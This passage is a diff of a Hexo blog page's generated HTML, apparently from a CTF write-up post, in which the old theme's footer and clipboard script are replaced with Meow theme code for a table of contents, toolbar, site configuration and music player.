-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
+  document.querySelectorAll('#toc-container .toc-list-link').forEach(function (link) {
+    var title = link.querySelector('.toc-list-text').textContent.trim();
+    var item = link.closest('.toc-list-item');
+    var level = (item.className.match(/toc-list-level-(\d)/) || [])[1];
+    var heading = headings.find(function (node) {
+      return usedHeadings.indexOf(node) === -1 &&
+        (!level || node.tagName === 'H' + level) &&
+        node.textContent.trim() === title;
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
+    if (!heading) return;
 
+    var target = heading.id ? heading : heading.querySelector('[id]');
+    if (!target) return;
+    usedHeadings.push(heading);
+    link.setAttribute('href', '#' + encodeURIComponent(target.id));
+    link.setAttribute('data-toc-target', target.id);
+  });
 
-<script src="/js/main.js"></script>
+  document.addEventListener('click', function (event) {
+    var link = event.target.closest('#toc-container .toc-list-link[data-toc-target]');
+    if (!link) return;
 
-<!-- search -->
+    var heading = document.getElementById(link.getAttribute('data-toc-target'));
+    if (!heading) return;
 
-<!-- Baidu Analytics -->
+    event.preventDefault();
+    event.stopPropagation();
+    window.history.pushState(null, '', link.getAttribute('href'));
+    heading.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }, true);
+});</script></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://jinggg1123.github.io/archives/2023/01/03/ctfshownodejs/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button" aria-controls="post-sidebar" aria-expanded="true"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2021 - 2026 <span>💗</span> <a href="/null">jjjing</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2021-11-23T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: true,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
 
-<!-- Cloudflare Analytics -->
+<script src="/js/plugins/dist/lazyload.min.js"></script>
 
-<!-- Disqus Comments -->
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
 
-<!-- utterances Comments -->
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
 
-</body>
-</html>
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
